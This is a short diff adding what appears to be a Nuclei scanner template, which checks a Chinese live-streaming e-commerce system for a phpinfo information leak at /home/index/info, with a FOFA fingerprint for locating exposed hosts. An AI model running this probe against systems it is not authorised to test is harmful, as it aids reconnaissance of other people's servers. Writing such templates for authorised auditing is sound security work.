@@ -1,0 +1,21 @@
+id: poc-ogry6t2d6b01hgpg
+info:
+  name: 短视频直播带货系统存在phpinfo信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ogry6t2d6b01hgpg'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ogry6t2d6b01hgpg
+    fofa: Body="/static/new/css/index-bf944a8f.css"
+http:
+- raw:
+  - 'GET /home/index/info HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
